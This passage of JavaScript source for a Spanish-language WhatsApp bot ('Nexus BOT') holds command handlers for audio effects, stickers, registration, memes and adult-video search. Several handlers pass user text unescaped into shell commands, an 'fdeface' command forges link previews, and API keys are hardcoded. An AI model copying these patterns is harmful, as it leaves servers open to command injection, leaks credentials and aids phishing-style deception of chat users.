					pai = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					//reply(mess.wait)
					tup = await samu330.downloadAndSaveMediaMessage(pai)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${tup} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(tup)
						if (err) return reply('¡Error!')
						hah = fs.readFileSync(ran)
						samu330.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: faud })
						fs.unlinkSync(ran)
					})
				} else {
					reply('*Por favor etiqueta un audio con el comando.*')
				}
			break

			case 'bass':
				if (((isAudio && !sam.message.audioMessage) || isQuotedAudio) && args.length == 0) {
					ass = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					//reply(mess.wait)
					bas = await samu330.downloadAndSaveMediaMessage(ass)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${bas} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(bas)
						if (err) return reply('¡Error!')
						hah = fs.readFileSync(ran)
						samu330.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fdoc })
						fs.unlinkSync(ran)
					})
				} else {
					reply('*Por favor etiqueta un audio con el comando.*')
				}
			break
			
			case 'grave':
				if (((isAudio && !sam.message.audioMessage) || isQuotedAudio) && args.length == 0) {
					muk = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					//reply(mess.wait)
					gem = await samu330.downloadAndSaveMediaMessage(muk)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(gem)
						if (err) return reply('¡Error!')
						hah = fs.readFileSync(ran)
						samu330.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fdoc })
						fs.unlinkSync(ran)
					})
				} else {
					reply('*Por favor etiqueta un audio con el comando.*')
				}
			break

			case 'hode':
				if (((isAudio && !sam.message.audioMessage) || isQuotedAudio) && args.length == 0) {
					ho = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					//reply(mess.wait)
					de = await samu330.downloadAndSaveMediaMessage(ho)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${de} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(de)
						if (err) return reply('¡Error!')
						hah = fs.readFileSync(ran)
						samu330.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fdoc })
						fs.unlinkSync(ran)
					})
				} else {
					reply('*Por favor etiqueta un audio con el comando.*')
				}
			break

			case 'imut':
				if (((isAudio && !sam.message.audioMessage) || isQuotedAudio) && args.length == 0) {
					im = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					//reply(mess.wait)
					ut = await samu330.downloadAndSaveMediaMessage(im)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${ut} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(ut)
						if (err) return reply('¡Error!')
						hah = fs.readFileSync(ran)
						samu330.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fdoc })
						fs.unlinkSync(ran)
					})
				} else {
					reply('*Por favor etiqueta un audio con el comando.*')
				}
			break
			
			case 'slow':
			case 'lento':
				if (((isAudio && !sam.message.audioMessage) || isQuotedAudio) && args.length == 0) {
					low = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					//reply(mess.wait)
					slo = await samu330.downloadAndSaveMediaMessage(low)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${slo} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(slo)
						if (err) return reply('¡Error!')
						hah = fs.readFileSync(ran)
						samu330.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fdoc })
						fs.unlinkSync(ran)
					})
				} else {
					reply('*Por favor etiqueta un audio con el comando.*')
				}
			break

			case 'trigger':
				if (((isAudio && !sam.message.audioMessage) || isQuotedAudio) && args.length == 0) {
					tri = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					//reply(mess.wait)
					ger = await samu330.downloadAndSaveMediaMessage(tri)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${ger} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(ger)
						if (err) return reply('¡Error!')
						hah = fs.readFileSync(ran)
						samu330.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fdoc })
						fs.unlinkSync(ran)
					})
				} else {
					reply('*Por favor etiqueta un audio con el comando.*')
				}
			break

			case 'wa.me':
			case 'wame':
				samu330.updatePresence(from, Presence.composing)
				options = {
					text: `Link de WhatsApp: *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*O tambien puedes usar:*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
					contextInfo: {
						mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
					}
				}
				samu330.sendMessage(from, options, MessageType.text, {
					quoted: ftoko
				})
				break

			case 'bug':
				if (!isRegister) return reply(mess.only.usrReg)
				const pesan = args.join(' ')
				if (pesan.length > 300) return samu330.sendMessage(from, 'Lo siento texto demasiado largo, máximo 300 caracteres', msgType.text, { quoted: sam })
				var nomor = sam.participant
				const teks1 = `*[REPORT]*\nNumero : @${nomor.split("@s.whatsapp.net")[0]}\nProblema : ${pesan}`

				var options = {
					text: teks1,
					contextInfo: { mentionedJid: [nomor] },
				}
				samu330.sendMessage('5219984907794@s.whatsapp.net', options, text, { quoted: sam })
				reply('El problema ha sido informado al propietario del BOT, informe falso o broma, sera ban definitivo.')
				break

			case 'reg':
				if (isRegister) return reply('*Tu cuenta ya ha sido registrada anteriormente.*')
				if (!q.includes('|')) return reply(`*POR FAVOR ESCRIBE BIEN EL FORMATO DE REGISTRO:* ${prefix + command} *Nombre|Edad*\nPor ejemplo: ${prefix + command} Smith|27`)
				const nombre = q.substring(0, q.indexOf('|') - 0)
				const edad = q.substring(q.lastIndexOf('|') + 1)
				const serialUser = createSerial(20)
				const momento = require('moment-timezone')
				const time = momento.tz('America/Lima').format('HH:mm:ss')
				if (isNaN(edad)) return await reply('*La edad tiene que ser un número 🙄*')
				if (nombre.length >= 10) return reply(`*¿Tu nombre es así de largo?*\nUn nombre no puede tener más de *10* letras`)
				if (edad > 30) return reply(`Uy, ya eres viejito.\n*Lo siento, pero no puedo registrarte si eres mayor de 30 años.*`)
				if (edad < 13) return reply(`Eres menor de 13 años, no puedo hacer un registro tuyo lo siento.\n\n*Si quieres muéstrame una autorización de tus padres diciendo que puedes pasar tiempo usando este Bot para que pueda aceptarte.*`)
				try {
					ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {

					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				veri = sender
				addRegisteredUser(sender, nombre, edad, time, serialUser)
				exec(`magick './src/reg.jpg' -gravity west -fill '#00FF00' -font './src/font-gue.ttf' -size 1280x710 -pointsize 90 -interline-spacing 7.5 -annotate +460-45 '${nombre}' -pointsize 50 -annotate +460+200 '${serialUser}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite './src/regsm.jpg'`)
					.on('error', () => reply('error'))
					.on('exit', () => {
						samu330.sendMessage(from, fs.readFileSync('./src/regsm.jpg'), MessageType.image, { quoted: sam, caption: `*「 REGISTRO CORRECTO 」*\n\n*◦ Nombre : ${nombre}*\n*◦ Número : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Se ha registrado correctamente*\n\n*Para ver todos los comandos que acepta Sam | Nexusᴮᴼᵀ escribe el siguiente comando: ${prefix}menu*` })
					})
				break

			case 'owner':
			case 'creador':
				await wa.sendContact(from, owner, "🥇𝑺𝒂𝒎𝒖𝟑𝟑𝟎🛺💨")
				break

			case 'meme':
				gh = body.slice(7).replace(/ /g, '%20')
				wo1 = gh.split("|")[0];
				wo2 = gh.split("|")[1];
				if ((isMedia && !sam.message.videoMessage || isQuotedImage)) {
					jars = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					wors = await samu330.downloadAndSaveMediaMessage(jars)
					datae = await imageToBase64(JSON.stringify(wors).replace(/\"/gi, ''))
					fs.writeFileSync('meme.jpeg', datae, 'base64')
					anu = await uploadImages('meme.jpeg')
					baleg = await getBuffer(`https://api.memegen.link/images/custom/${wo1}/${wo2}.png?background=${anu}`)
					samu330.sendMessage(from, baleg, MessageType.image, { quoted: sam })
				}
				break
			case 'noprefix':
				prefix = ''
				reply(`*EL PREFIJO PARA LOS COMANDOS YA NO ES NECESARIO AHORA*`)
				break

			case 'shortlink':
				url = args.join(" ")
				request(`https://tinyurl.com/api-create.php?url=${url}`, function (error, response, body) {
					try {
						reply(body)
					} catch (e) {
						reply(e)
					}
				})
				break

			case 'exif':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (args.length < 1) return reply(`Forma de uso: *${prefix}exif nombre|autor*`)
				if (!arg.split('|')) return reply(`Forma de uso: *${prefix}exif nombre|autor*`)
				exif.create(q.split('|')[0], q.split('|')[1])
				reply(`*El nombre de paquete de Stiker a cambiado a:* _${arg.split('|')[0]}\n*Y el autor a:* ${arg.split('|')[1]}`)
				break

			case 'takestick':
				if (!isQuotedSticker) return reply(`Etiqueta un stiquer y escribe: *${prefix}takestick nombre|autor*`)
				const stsam = body.slice(11)
				if (!stsam.includes('|')) return reply(`Etiqueta un stiquer y escribe: *${prefix}takestick nombre|autor*`)
				const encmedia = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
				const packname = stsam.split('|')[0]
				const author = stsam.split('|')[1]
				exif.create(packname, author, `takestick_${sender}`)
				exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
					if (error) return reply('error')
					wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), floc)
					fs.unlinkSync(media)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break

			case 'scdl':
				var url = budy.slice(6)
				var res1 = await axios.get(`https://lindow-api.herokuapp.com/api/dlsoundcloud?url=${url}&apikey=${apikey}`)
				var { title, result } = res1.data
				thumbb = await getBuffer(`${res1.data.image}`)
				samu330.sendMessage(from, thumbb, MessageType.image, { caption: `${title}` })
				audiony = await getBuffer(result)
				samu330.sendMessage(from, audiony, MessageType.audio, { mimetype: 'audio/mp4', filename: `${title}.mp3`, quoted: sam })
				break

			case 'par':
				pares = await axios.get(`https://lindow-api.herokuapp.com/api/ppcouple?apikey=${apikey}`)
				var { male, female } = pares.data.result
				picmale = await getBuffer(`${male}`)
				samu330.sendMessage(from, picmale, image, { quoted: fimg })
				picfemale = await getBuffer(`${female}`)
				samu330.sendMessage(from, picfemale, image, { quoted: fimg })
				break

			case 'animevid':
				url = `https://lindow-api.herokuapp.com/api/randomaesthetic?apikey=${apikey}`
				estetik = await getBuffer(url)
				samu330.sendMessage(from, estetik, MessageType.video, { mimetype: 'video/mp4', duration: 999999999, filename: `estetod.mp4`, quoted: fvid })
				break

			case 'asupan':
				url = `https://lindow-api.herokuapp.com/api/asupan?apikey=${apikey}`
				asupan = await getBuffer(url)
				samu330.sendMessage(from, asupan, MessageType.video, { mimetype: 'video/mp4', duration: 999999999, filename: `asupan.mp4`, quoted: fvid })
				break

			case 'robar':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (!isQuotedSticker) return reply(`*Tururuu.... y el stiker kbron?*`)
				const encmediia = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				const meidia = await samu330.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
				exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
					if (error) return reply('error')
					wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
					fs.unlinkSync(meidia)
				})
				break

			case 'swm':
			case 'stickerwm':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (isMedia && !sam.message.videoMessage || isQuotedImage) {
					if (!arg.includes('|')) return reply(`Envie o etiquete una imagen con el comando: *${prefix}swn nombre|autor*`)
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					const packname1 = arg.split('|')[0]
					const author1 = arg.split('|')[1]
					exif.create(packname1, author1, `stickwm_${sender}`)
					await ffmpeg(`${media}`)
						.input(media)
						.on('start', function (cmd) {
							console.log(`Started : ${cmd}`)
						})
						.on('error', function (err) {
							console.log(`Error : ${err}`)
							fs.unlinkSync(media)
							reply('error')
						})
						.on('end', function () {
							console.log('Finish')
							exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
								if (error) return reply('error')
								wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), fliveLoc)
								fs.unlinkSync(media)
								fs.unlinkSync(`./sticker/${sender}.webp`)
								fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
							})
						})
						.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
						.toFormat('webp')
						.save(`./sticker/${sender}.webp`)
				} else if ((isMedia && sam.message.videoMessage.fileLength < 10000000 || isQuotedVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
					if (!arg.includes('|')) return reply(`Envie o etiquete un video/gif con el comando: *${prefix}swm nombre|autor*`)
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					const packname1 = arg.split('|')[0]
					const author1 = arg.split('|')[1]
					exif.create(packname1, author1, `stickwm_${sender}`)
					reply('wait')
					await ffmpeg(`${media}`)
						.inputFormat(media.split('.')[4])
						.on('start', function (cmd) {
							console.log(`Started : ${cmd}`)
						})
						.on('error', function (err) {
							console.log(`Error : ${err}`)
							fs.unlinkSync(media)
							tipe = media.endsWith('.mp4') ? 'video' : 'gif'
							reply('error')
						})
						.on('end', function () {
							console.log('Finish')
							exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
								if (error) return reply('error')
								wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
								fs.unlinkSync(media)
								fs.unlinkSync(`./sticker/${sender}.webp`)
								fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
							})
						})
						.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
						.toFormat('webp')
						.save(`./sticker/${sender}.webp`)
				} else {
					reply(`Envie o etiquete una imagen/vido/gif con el comando: ${prefix}swm nombre|autor *OJO!* El video/gif no debe de durar mas de 10 segundos`)
				}
				break

			case 'pornode':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Japonesas`)
				query = args.join(' ')
				get_result = await getJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${api}&query=${query}`)
				get_result = get_result.result
				ini_txt = ""
				for (var x of get_result) {
					ini_txt += `Titulo   : ${x.title}\n`
					ini_txt += `Vistas   : ${x.views}\n`
					ini_txt += `Duracion : ${x.duration}\n`
					ini_txt += `Uploader : ${x.uploader}\n`
					ini_txt += `Link     : ${x.link}\n`
					ini_txt += `Imagen   : ${x.thumbnail}\n`
				}
				reply(ini_txt)

				break

			case 'xvid':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Japonesas`)
				query = args.join(' ')
				get_result = await getJson(`https://fxc7-api.herokuapp.com/api/search/xvideos?apikey=Fxc7&query=${query}`)
				get_result = get_result.result
				ini_txt = ""
				for (var x of get_result) {
					ini_txt += `Titulo   : ${x.title}\n`
					ini_txt += `Duracion : ${x.duration}\n`
					ini_txt += `Uploader : ${x.channel.name}\n`
					ini_txt += `Link     : ${x.url}\n\n╼━━━━━━━━━━━━━━━━━━━━━━━━━━╾\n`
				}
				reply(ini_txt)

				break

			case 'dxvid':
				if (!isRegister) return reply(mess.only.usrReg)
				if (!isGroup) return reply(mess.only.group)
				if (!isNsfw) return reply(mess.nsfw)
				codigor = [1234, 1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999, 0000, 1122, 1133, 1144, 1555, 5566, 7183, 7874, 89874, 0006, 8732365874524, 635463185, 78676587135, 78573857, 725471469385013690147590398473918461837463781567485713, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
				codigo = codigor[Math.floor(Math.random() * codigor.length)]
				nopsw = samu330.prepareMessageFromContent(from, {
					"listMessage": { "title": "*🔐Codigo requerido*", "description": `Para usar este comando es obligatorio establecer un codigo de validacion, este codigo te permitira ejercer esta funcion.\n\n*Puedes usar cualquier número, o puedes generar uno en el boton de abajo, solo te quedaria copiar y pegar ese codigo*\n\nPara seguir con tu descarga, debes escribir el comando de la siguiente manera:\n*${prefix}dxvid (CODIGO)|(LINK)*\n_Es importante que uses el signo_ *"|"* _para separar el codigo del link._`, "buttonText": "Quieres un codigo ya establecido por el Bot? Click aqui.", "listType": "SINGLE_SELECT", "sections": [{ "rows": [{ "title": `${codigo}`, "singleSelectReply": { "selectedRowId": "*Bien, ahora copia y pega*" } }] }] }
				}, { quoted: sam, sendEphemeral: true, contextInfo: { forwardingScore: 999999, isForwarded: true } })
				if (!q.includes('|')) return samu330.relayWAMessage(nopsw)
				const contra1 = q.substring(0, q.indexOf('|') - 0)
				if (isNaN(contra1)) return await reply('El codigo es un Numero')
				const linkx = q.substring(q.lastIndexOf('|') + 1)
				if (!contra1) return reply(`*Y la contraseña?*\n_Recuerda separar la contraseña del link con el simbolo_ *`)
				if (!linkx) return reply(`*Y el link?🙄*\nSi no tienes link de *Xvideos*, usa el comando ${prefix}xvid para buscar un video.`)
				xv = await getJson(`https://fxc7-api.herokuapp.com/api/download/xvideos?url=${linkx}&apikey=Fxc7`)
				v = xv.result
				infoxv = `*Espere un momento, su video se esta enviando*\n\n_Informacion del video:_\n*Link:* ${v.url}\n*Titulo:* ${v.title}\n*Largo del video:* ${v.length}\n*Vistas* ${v.views}\n\n*😋Tu video se esta enviando...*`
				reply(infoxv)
				videox = await getBuffer(v.streams.hq)
				samu330.sendMessage(from, videox, video)
				break

			case 'lucky':
				a = '🍇'
				b = '🍎'
				c = '🍓'
				e = '🍑'
				f = '💰'
				g = '🥝'
				pw = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck = pw[Math.floor(Math.random() * pw.length)]
				pw1 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck1 = pw1[Math.floor(Math.random() * pw1.length)]
				pw2 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck2 = pw2[Math.floor(Math.random() * pw2.length)]
				pw3 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck3 = pw3[Math.floor(Math.random() * pw3.length)]
				pw4 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck4 = pw4[Math.floor(Math.random() * pw4.length)]
				pw5 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck5 = pw5[Math.floor(Math.random() * pw5.length)]
				pw6 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck6 = pw6[Math.floor(Math.random() * pw6.length)]
				pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck7 = pw7[Math.floor(Math.random() * pw7.length)]
				pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
				luck7 = pw7[Math.floor(Math.random() * pw7.length)]
				s = `┃ │  ${luck} │  ${luck1} │ ${luck2}`
				a = `┃ │  ${luck3} │  ${luck4} │ ${luck5}`
				m = `┃ │  ${luck6} │  ${luck7} │ ${luck7}`
				u = `┌ ﹍﹍𝈺﹉﹉﹉𝈻﹍﹍ ┐ 
╭──╼┥𝈸𖾗ᷤ𖾕꯭ͣ𖾔꯭𖾔ͫ𖽙ͧ𝈹┝╾──╮
╽ ┌──────────┐ ┃
${s}
┃ ├──────────┤ ┃
${a}
┃ ├──────────┤ ┃
${m}
╿ └──────────┘ ╿
╰─┨⃞🔮𝉃𝜄𝜐𝉃𝜍𝜅𝉃𝛾🔮⃞ ┠─╯`
				reply(`${u}`)
				break

			case 'sticker':
			case 's':
			case 'stiker':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (isMedia && !sam.message.videoMessage || isQuotedImage) {
					const encmedia1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					const media1 = await samu330.downloadAndSaveMediaMessage(encmedia1, `./sticker/${sender}`)
					const packname10 = `Sam NexusBOT\n\n        Sticker`
					const author10 = args.join(' ')
					exif.create(packname10, author10, `stickwm_${sender}`)
					await ffmpeg(`${media1}`)
						.input(media1)
						.on('start', function (cmd) {
							console.log(`Started : ${cmd}`)
						})
						.on('error', function (err) {
							console.log(`Error : ${err}`)
							fs.unlinkSync(media1)
							reply('*Intenta de nuevo*')
						})
						.on('end', function () {
							console.log('Finish')
							exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
								if (error) return reply('error')
								wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
								fs.unlinkSync(media1)
								fs.unlinkSync(`./sticker/${sender}.webp`)
								fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
							})
						})
						.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,
fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p]
paletteuse`])
						.toFormat('webp')
						.save(`./sticker/${sender}.webp`)
				} else if ((isMedia && sam.message.videoMessage.fileLength < 10000000 || isQuotedVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
					const encmedia2 = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.
						contextInfo : sam
					const media2 = await samu330.downloadAndSaveMediaMessage(encmedia2, `./sticker/${sender}`)
					const packname101 = `Sam NexusBOT\n\n        Sticker`
					const author101 = args.join(' ')
					exif.create(packname101, author101, `stickwm_${sender}`)
					reply('*⌛EN PROCESO*')
					await ffmpeg(`${media2}`)
						.inputFormat(media2.split('.')[4])
						.on('start', function (cmd) {
							console.log(`Started : ${cmd}`)
						})
						.on('error', function (err) {
							console.log(`Error : ${err}`)
							fs.unlinkSync(media2)
							tipe = media.endsWith('.mp4') ? 'video' : 'gif'
							reply('*Intenta de nuevo*')
						})
						.on('end', function () {
							console.log('Finish')
							exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
								if (error) return reply('error')
								wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
								fs.unlinkSync(media2)
								fs.unlinkSync(`./sticker/${sender}.webp`)
								fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
							})
						})
						.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decre
ase,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
						.toFormat('webp')
						.save(`./sticker/${sender}.webp`)
				} else {
					reply(`Envie o etiquete una imagen/vido/gif con el comando: ${prefix}swm nombre|autor *OJO!* El video/gif no debe de durar mas de 10 segundos`)
				}
				break
			
			case 'snobg':
				if ((isMedia || isQuotedImage)) {
					const encmedianb1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					const median1 = await samu330.downloadAndSaveMediaMessage(encmedianb1)
					reply(mess.wait)
					keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
					ranp = getRandom('.png')
					await removeBackgroundFromImageFile({ path: median1, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
						fs.unlinkSync(median1)
						let buffer = Buffer.from(res.base64img, 'base64')
						samu330.sendMessage(from, buffer, sticker, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
						fs.unlinkSync(buffer)
					})
				}
				break
			case 'getbio':
				var yy = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
				var p = await samu330.getStatus(`${yy}`, MessageType.text)
				reply(p.status)
				if (p.status == 401) {
					reply("[ERROR 401] Status Profile Not Found")
				}
				break
			case 'getpic':
				if (sam.message.extendedTextMessage != undefined) {
					mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await samu330.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					thumb = await getBuffer(pic)
					samu330.sendMessage(from, thumb, MessageType.image, { caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒' })
				}
				break
			case 'fdeface':
				var nn = budy.slice(9)
				var urlnye = nn.split("|")[0];
				var titlenye = nn.split("|")[1];
				var descnye = nn.split("|")[2];
				run = getRandom('.jpeg')
				var media1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
				var media2 = await samu330.downloadAndSaveMediaMessage(media1)
				var ddatae = await imageToBase64(JSON.stringify(media2).replace(/\"/gi, ''))
				samu330.sendMessage(from, {
					text: `${urlnye}`,
					matchedText: `${urlnye}`,
					canonicalUrl: `${urlnye}`,
					description: `${descnye}`,
					title: `${titlenye}`,
					jpegThumbnail: ddatae
				}, 'extendedTextMessage', { detectLinks: false })
				break

			case 'setstatus':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (!arg) return reply('Escribe algo almenos')
				wa.setBio(arg)
					.then((res) => wa.sendFakeStatus2(from, JSON.stringify(res), fake))
					.catch((err) => wa.sendFakeStatus2(from, JSON.stringify(err), fake))
				break
			case 'setname':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (!arg) return reply('Escribe algo almenos')
				wa.setName(arg)
					.then((res) => wa.sendFakeStatus2(from, JSON.stringify(res), fake))
